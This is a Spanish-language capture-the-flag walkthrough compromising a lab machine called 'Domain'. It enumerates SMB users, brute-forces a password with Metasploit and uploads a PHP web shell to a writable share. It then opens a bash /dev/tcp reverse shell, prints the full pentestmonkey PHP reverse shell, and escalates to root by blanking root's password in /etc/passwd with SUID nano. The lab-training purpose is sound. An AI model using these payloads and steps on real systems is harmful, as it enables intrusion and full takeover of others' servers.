
<p align="center">
    <img src="../img/Pasted_image_20241210202408.png" width="500">
</p>


Vamos a realizar la máquina **Domain** de nivel medio que simula un entorno real con diversas vulnerabilidades comunes aprovechando una vulnerabilidad en el servicio **SAMBA**.

---

## Reconocimiento inicial


Empezaremos realizando un ping a la máquina para verificar su correcto funcionamiento, al hacerlo vemos que tiene un TTL de 64, lo que significa que la máquina objetivo usa un sistema operativo Linux.
```
ping -c 1 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20241215183622.png" width="500">
</p>


---

## **Enumeración**


#### Escaneo de puertos

Realizamos un escaneo de puertos básico con **nmap** para identificar los puertos que están abiertos:
```
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20241215183703.png" width="500">
</p>

**Resultados del escaneo:**

| Puerto  | Estado | Servicio     |     |
| ------- | ------ | ------------ | --- |
| 80/tcp  | open   | http         |     |
| 139/tcp | open   | netbios-ssn  |     |
| 445/tcp | open   | microsoft-ds |     |

Realizamos un segundo escaneo a los puertos abiertos, lanzando una serie de script por defecto de `nmap` y reconocimiento de servicios.
```
nmap -p80 -sVC --min-rate 5000 -n -Pn 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20241215184044.png" width="500">
</p>

| Puerto  | Estado | Servicio    | Versión                      |
| ------- | ------ | ----------- | ---------------------------- |
| 80/tcp  | open   | http        | Apache httpd 2.4.52 (Ubuntu) |
| 139/tcp | open   | netbios-ssn | Samba smbd 4.6.2             |
| 445/tcp | open   | netbios-ssn | Samba smbd 4.6.2 1           |
**Puertos y servicios abiertos:**
- **Puerto 80/tcp (HTTP):** Indica que el sistema está ejecutando un servidor web Apache versión 2.4.52 en un sistema operativo Ubuntu. Este puerto se utiliza para servir páginas web.
- **Puertos 139/tcp y 445/tcp (NetBIOS-SSN):** Estos puertos están asociados con el protocolo SMB (Server Message Block) y se utilizan para compartir archivos y recursos en redes Windows. La información adicional indica que se está utilizando el servicio Samba versión 4.6.2, un software libre que implementa el protocolo SMB.

**Conclusión:**
El sistema objetivo es un servidor que ejecuta al menos los siguientes servicios:

- **Servidor web HTTP:** Probablemente un servidor web que sirve páginas web.
- **Servidor SMB (Samba):** Proporciona servicios de compartición de archivos y recursos en una red, típicamente en un entorno Windows.

**Información adicional:**
- **Sistema operativo:** Aunque no se puede determinar con certeza, la información de la versión de Apache y Samba sugiere que el sistema operativo es probablemente una distribución de Linux basada en Ubuntu.
- **Seguridad:** Los puertos abiertos pueden representar una vulnerabilidad si no están correctamente configurados o parcheados. Es importante tomar medidas de seguridad adecuadas, como mantener actualizado el software y utilizar firewalls para proteger el sistema.

---


<h3><center> Análisis del servidor web(puerto 80)</center></h3>


Al acceder al servidor web y revisar el código fuente, no encontramos nada relevante.
<p align="center">
    <img src="../img/Pasted_image_20241215184406.png" width="500">
</p>


---

<h3><center> Análisis servicio SAMBA (puerto 445)</center></h3>

#### Enumerar recursos

Podemos enumerar recursos compartidos sin proporcionar credenciales
```
smbmap -H 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20241215184644.png" width="500">
</p>

Pero vemos que no hemos podido enumerar recursos compartidos.



#### Enumerar usuarios

Tenemos la herramienta `rpcclient` la cual, podemos identificar usuarios sin tener credenciales.
```
rpcclient -U '' -N 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20241215184950.png" width="500">
</p>

Nos proporciona una consola, en ella, podemos usar los siguientes comandos para encontrar información del sistema y de usuarios:
```
srvinfo     # información del sistema
querydispinfo # Enumera usuarios
enumdomusers   # Enumera usuarios
```

<p align="center">
    <img src="../img/Pasted_image_20241215185447.png" width="500">
</p>



También podemos enumerarlo con la herramienta **enum4linux**
```
enum4linux -U 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20241215193140.png" width="500">
</p>


Tenemos información del sistema y encontramos dos usuarios

**Usuarios:**

| Usuarios | Contraseñas |
| -------- | ----------- |
| james    |             |
| bob      |             |

---

#### Fuerza Bruta Contraseña

#### **Metasploit**
Podemos realizar una fuerza bruta para encontrar la contraseña de alguno de ellos. Para poder encontrar la contraseña, podemos utilizar un módulo de `metasploit`, que es **smb_login**.

Iniciamos `metasploit` y buscamos el módulo
```
msfconsole -q
search smb_login
```

<p align="center">
    <img src="../img/Pasted_image_20241215185841.png" width="500">
</p>

Usamos el módulo
```
use 0
#ó
use auxiliary/scanner/smb/smb_login
```

<p align="center">
    <img src="../img/Pasted_image_20241215185941.png" width="500">
</p>

Mostramos las opciones
```
show options
```

<p align="center">
    <img src="../img/Pasted_image_20241215190021.png" width="500">
</p>


Configuramos las opciones. Tenemos que modificar el `RHOST` indicando la IP de la máquina victima,  indicar el usuarios `bob` en `SMBUser`, indicar un diccionario en `PASS_FILE`,  modificar el `STOP_ON_SUCCESS`para que cuando encuentre una contraseña de pare y no siga analizando y el `VERBOSE` para que no me muestre todas las comprobación que esté realizando.
```
set RHOST 172.17.0.2
set SMBUser bob
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set VERBOSE false
```

<p align="center">
    <img src="../img/Pasted_image_20241215191003.png" width="500">
</p>

Iniciamos el módulo
```
run
```

<p align="center">
    <img src="../img/Pasted_image_20241215191428.png" width="500">
</p>

Encontramos la contraseña del usuario `bob`.


| Usuarios | Contraseñas |
| -------- | ----------- |
| james    |             |
| bob      | star        |


---




Teniendo un usuario y contraseña, podemos enumerar los recursos compartidos y ver si el usuario `bob`, en este caso, tiene algún permiso en uno de esos recursos
```
smbmap -u 'bob' -p 'star' -H 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20241215192558.png" width="500">
</p>




Vemos que el usuario `bob`, tiene permisos de *lectura/escritura*, en el recurso compartido llamado **html**. Por lo que seguimos enumerando pero esta vez la carpeta *html*
```
smbmap -u 'bob' -p 'star' -H 172.17.0.2 -r html
```

<p align="center">
    <img src="../img/Pasted_image_20241215192817.png" width="500">
</p>




Dentro del recurso *html*, tenemos un archivo llamado `index.html`, que será la misma web que analizamos al principio.
<p align="center">
    <img src="../img/Pasted_image_20241215184406.png" width="500">
</p>


Como el usuario `bob`, tiene permisos de escritura, podemos subir alguna **web shell**, algún archivo malicioso y poder ejecutar comandos.

---


## **Explotación**

### Creamos una WEB SHELL
Con la herramienta `nano`, creamos una fichero llamado **pwned.php** que va ser la `web shell` que subiremos al `smb` y el código es:
```
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "<pre>";
?>
```

<p align="center">
    <img src="../img/Pasted_image_20241215193815.png" width="500">
</p>

**¿Qué hace este código?**
Este fragmento de código PHP es una bomba de tiempo en tu sitio web. Básicamente, le permite a cualquier persona que visite tu sitio web ejecutar cualquier comando que quiera en tu servidor.


---

### Subimos archivo
Para subir el archivo es mas fácil usar la herramienta `smbclient`.
```
smbclient //{ IP Victima }/{ donde guardar el archivo } -U usuario%contraseña -c "comando a ejecutar"
```

```
smbclient //172.17.0.2/html -U bob%star -c "put pwned.php"
```

<p align="center">
    <img src="../img/Pasted_image_20241215194239.png" width="500">
</p>


Comprobamos si se subió correctamente, enumerando de nuevo el recurso `html`
```
smbmap -u 'bob' -p 'star' -H 172.17.0.2 -r html
```

<p align="center">
    <img src="../img/Pasted_image_20241215194355.png" width="500">
</p>



Vemos que se subió correctamente. Ahora con esa `web shell`, podemos ir al navegador y a la página web que aloja este sistema y hacer referencia en la *URL*, el fichero subido y creado por nosotros `pwned.php` y ejecutar cualquier comando desde la web.
<p align="center">
    <img src="../img/Pasted_image_20241215194649.png" width="500">
</p>


Vemos que podemos ejecutar comandos desde la web. Lo que realizaremos es meter una `reverse shell`, para obtener conexión desde nuestra máquina. Como tenemos que ejecutar el comando para que nos de la `reverse shell`, desde el navegador, tenemos que encodearlo. Para  ello utilizamos la herramienta `burpsuite`.

Primero vamos a la web [ReverseShell][[http://www.reverseshell.com] para obtener una `reverse shell`.

<p align="center">
    <img src="../img/Pasted_image_20241215195312.png" width="500">
</p>


Copiamos el comando `bash -i >& /dev/tcp/192.168.1.31/1234 0>&1` y me dirijo al *burpsuite*, en la pestaña `decoder` y añadimos
```
bash -c "bash -i >& /dev/tcp/192.168.1.31/1234 0>&1"
```

<p align="center">
    <img src="../img/Pasted_image_20241215195537.png" width="500">
</p>


Copiamos el resultado de encodear la `reverse shell`
```
%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%33%31%2f%31%32%33%34%20%30%3e%26%31%22
```

y lo pegamos en el navegador, pero antes nos ponemos en la escucha con `netcat` por el puerto que indicamos en la `reverse shell`
```
nc -nvlp 1234
```

<p align="center">
    <img src="../img/Pasted_image_20241215195728.png" width="500">
</p>

y en el navegador
```
172.17.0.2/pwned.php?cmd=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%33%31%2f%31%32%33%34%20%30%3e%26%31%22
```


Si comprobamos el `netcat`, vemos que obtuvimos una `reverse shell`.
<p align="center">
    <img src="../img/Pasted_image_20241215195858.png" width="500">
</p>


---
## **Explotación 2**

Otra forma de explotar el servicio de **SAMBA**, es en vez de crear un `web shell`, podemos crear directamente una `reverse shell` y subirla al servicio y ejecutarla.

### Creamos una REVERSE SHELL
Con la herramienta `nano`, creamos una fichero llamado **exploit.php** que va ser la `reverse shell` que subiremos al `smb` y el código lo podemos encontrar en el github de [pentesterMokey][[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php] y cambiamos la *IP* y el *puerto*. 
```
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.1.31';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Copiamos todo este código y creamos el fichero pegando el código
<p align="center">
    <img src="../img/Pasted_image_20241215204836.png" width="500">
</p>



También podemos encontrar un `reverse shell` en la web [ReverseShell][[http://www.reverseshell.com]
<p align="center">
    <img src="../img/Pasted_image_20241215205138.png" width="500">
</p>



---
### Subimos archivo
Para subir el archivo es mas fácil usar la herramienta `smbclient`.
```
smbclient //{ IP Victima }/{ donde guardar el archivo } -U usuario%contraseña -c "comando a ejecutar"
```

```
smbclient //172.17.0.2/html -U bob%star -c "put exploit.php"
```

<p align="center">
    <img src="../img/Pasted_image_20241215205231.png" width="500">
</p>


Comprobamos si se subió correctamente, enumerando de nuevo el recurso `html`
```
smbmap -u 'bob' -p 'star' -H 172.17.0.2 -r html
```

<p align="center">
    <img src="../img/Pasted_image_20241215205326.png" width="500">
</p>

Vemos que se subió correctamente. Ahora desde el navegador tenemos que intentar ejecutar el fichero `exploit.php`, que hemos creado, pero antes tenemos que ponernos a la escucha con `netcat`, por el puerto especificado en el fichero o exploit.

```
nc -nvlp 1234
```

<p align="center">
    <img src="../img/Pasted_image_20241215195728.png" width="500">
</p>

Ejecutamos el exploit en el navegador

<p align="center">
    <img src="../img/Pasted_image_20241215205603.png" width="500">
</p>

Si vamos a la terminal donde estamos a al escucha con `netcat`

<p align="center">
    <img src="../img/Pasted_image_20241215205647.png" width="500">
</p>

Para obtener una `bash`, ejecutamos el código:
```
/bin/bash -i
```

<p align="center">
    <img src="../img/Pasted_image_20241215205743.png" width="500">
</p>

---

## Post-Explotación

Teniendo una `bash`, podemos realizar el tratamiento de la **TTY**.

### Tratamiento de la TTY
```
script /dev/null -c bash
```

<p align="center">
    <img src="../img/Pasted_image_20241215205934.png" width="500">
</p>

Suspendemos la `zsh`
```
CTRL+ Z
```


Reseteamos la  **stty** y reseteamos **xterm**
```
stty raw -echo; fg
[1] + continued nc -nvlp 1234
							 reset xterm
```

<p align="center">
    <img src="../img/Pasted_image_20241215210233.png" width="500">
</p>
<p align="center">
    <img src="../img/Pasted_image_20241215210257.png" width="500">
</p>

Y ahora realizamos las exportaciones
```
export TERM=xterm
export SHELL=bash
```

<p align="center">
    <img src="../img/Pasted_image_20241215210403.png" width="500">
</p>

Ahora tenemos todas las funciones que debería tener una **SHELL**, lo que tenemos que configurar las filas y columnas de la  **stty** para ajustar el tamaño de mi pantalla. Si veo la configuración de filas y columnas de mi pantalla.
```
stty size
```

<p align="center">
    <img src="../img/Pasted_image_20241215210612.png" width="500">
</p>

Tengo 45 filas y 208 columnas. Si compruebo la de la máquina victima
```
stty size
```

<p align="center">
    <img src="../img/Pasted_image_20241215210709.png" width="500">
</p>

Tiene 24 filas y 80 columnas. Para adaptar la pantalla de la máquina victima a la mía modifico las filas y columnas de la *stty*
```
stty rows 45 columns 208
```

<p align="center">
    <img src="../img/Pasted_image_20241215210836.png" width="500">
</p>

---

### Escalada de privilegios

Primero comprobé el comando `sudo -l`, pero nos indica que no está instalado el comando `sudo`.
```
sudo -l
```

<p align="center">
    <img src="../img/Pasted_image_20241215210959.png" width="500">
</p>

Por lo que compruebo los privilegios **SUID** de los binarios, que podemos ejecutar de forma privilegiada y que puedan ser explotados para escalar privilegios.
```
find / -perm -4000 2>/dev/null
```

<p align="center">
    <img src="../img/Pasted_image_20241215211048.png" width="500">
</p>

El binario que me llama la atención y que no debería estar con los permisos **SUID**, es `/usr/bin/nano`, que es el editor de texto que tiene por defecto los linux. Teniendo este binario "nano" que puedo ejecutar como usuario `root`y sabiendo que las contraseñas se guardan el el fichero `/etc/passwd`, podré editar  como usuario con privilegios, es decir, como si fuera el root y modificar el fichero `passwd`, cambiando la contraseña del usuario `root`, o directamente quitando la contraseña.
```
/usr/bin/nano /etc/passwd
```

<p align="center">
    <img src="../img/Pasted_image_20241215211621.png" width="500">
</p>

Para quitar la contraseña al usuario `root`, solo tenemos que borrar la `x`, es decir, debería quedar:
```
root::0:0:root:/root:/bin/bash
```

<p align="center">
    <img src="../img/Pasted_image_20241215211738.png" width="500">
</p>

Guardamos el fichero y si ahora cambiamos a usuario `root`, con el comandos `su root`, deberíamos cambiarnos sin que nos pida la contraseña.
```
su root
```

<p align="center">
    <img src="../img/Pasted_image_20241215211851.png" width="500">
</p>

Hemos conseguido escalar privilegios.